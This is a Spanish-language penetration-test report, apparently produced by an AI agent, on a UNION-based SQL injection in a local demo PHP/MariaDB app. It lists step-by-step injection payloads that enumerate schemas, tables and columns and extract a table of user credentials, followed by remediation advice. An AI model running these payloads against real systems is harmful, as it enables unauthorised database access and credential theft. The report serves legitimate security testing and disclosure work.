# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30  
**Analista:** GitHub Copilot CLI  
**Modelo:** claude-sonnet-4.6

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **SQL Injection clásica (UNION-based)** en el parámetro `id` del formulario de búsqueda de usuarios. La vulnerabilidad permite extraer información completa de la base de datos, incluyendo credenciales de todos los usuarios.

---

## Información del Objetivo

- **URL:** http://web.dev.local:8083/
- **Tecnología:** PHP con MariaDB
- **Parámetro vulnerable:** `id` (método GET)
- **Base de datos:** sqli_demo
- **Motor de BD:** MariaDB 10.11.14-ubu2204

---

## Vulnerabilidad Detectada

### SQL Injection - UNION Based (GET Parameter)

**Clasificación:** CWE-89 - Improper Neutralization of Special Elements used in an SQL Command  
**Severidad:** CRÍTICA  
**CVSS v3:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

#### Descripción

El parámetro `id` en la URL no sanitiza correctamente la entrada del usuario antes de incluirla en la consulta SQL. Esto permite a un atacante manipular la lógica de la consulta e inyectar sentencias SQL arbitrarias.

El código vulnerable se encuentra en `/var/www/html/low.php` línea 11, donde se construye la consulta directamente con la entrada del usuario sin usar consultas preparadas.

#### Prueba de concepto

**Payload de detección (error SQL):**
```
GET /?id=1'&Submit=Submit
```
**Respuesta del servidor:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

**Payload UNION - identificación de columnas:**
```
GET /?id=-1' UNION SELECT 1,2-- -&Submit=Submit
```

**Payload extracción de base de datos y versión:**
```
GET /?id=-1' UNION SELECT database(),version()-- -&Submit=Submit
```
**Resultado:** `sqli_demo | 10.11.14-MariaDB-ubu2204`

---

## Explotación

### Paso 1: Enumeración de bases de datos

```sql
-1' UNION SELECT group_concat(schema_name),2 FROM information_schema.schemata-- -
```
**Bases de datos encontradas:** `information_schema, sqli_demo, sys, mysql, performance_schema`

### Paso 2: Enumeración de tablas

```sql
-1' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema='sqli_demo'-- -
```
**Tablas encontradas:** `users`

### Paso 3: Enumeración de columnas

```sql
-1' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'-- -
```
**Columnas encontradas:** `user_id, first_name, last_name, username, password, email`

### Paso 4: Extracción de credenciales

```sql
-1' UNION SELECT group_concat(user_id,0x7c,username,0x7c,password ORDER BY user_id SEPARATOR ','),group_concat(email ORDER BY user_id SEPARATOR ',') FROM sqli_demo.users-- -
```

**Credenciales extraídas:**

| ID | Usuario    | Contraseña  | Email                   |
|----|------------|-------------|-------------------------|
| 1  | admin      | password123 | admin@example.com       |
| 2  | jsmith     | secret456   | jane@example.com        |
| 3  | bjohnson   | mypass789   | bob@example.com         |
| 4  | awilliams  | qwerty123   | alice@example.com       |
| 5  | cbrown     | password    | charlie@example.com     |
| 6  | ddavis     | secure123   | diana@example.com       |
| 7  | emiller    | hackme      | eve@example.com         |
| 8  | fwilson    | admin123    | frank@example.com       |

---

## Impacto

- **Confidencialidad:** ALTO - Exposición completa de credenciales de todos los usuarios
- **Integridad:** ALTO - Posibilidad de modificar, insertar o eliminar datos en la BD
- **Disponibilidad:** MEDIO - Posible eliminación de datos o tablas

---

## Recomendaciones

1. **Usar consultas preparadas (Prepared Statements):**
   ```php
   $stmt = $mysqli->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea estrictamente numérico antes de usarlo.

3. **Principio de mínimo privilegio:** El usuario de la base de datos no debería tener acceso a `information_schema` ni a otras bases de datos del sistema.

4. **Deshabilitar mensajes de error detallados** en producción para no revelar información del stack trace ni rutas de ficheros.

5. **Implementar WAF** (Web Application Firewall) como capa adicional de defensa.

---

## Conclusión

La aplicación web analizada presenta una vulnerabilidad crítica de SQL Injection que permite a cualquier atacante no autenticado extraer la totalidad de los datos de la base de datos, incluyendo credenciales en texto plano. Se recomienda aplicar las correcciones indicadas de forma inmediata.
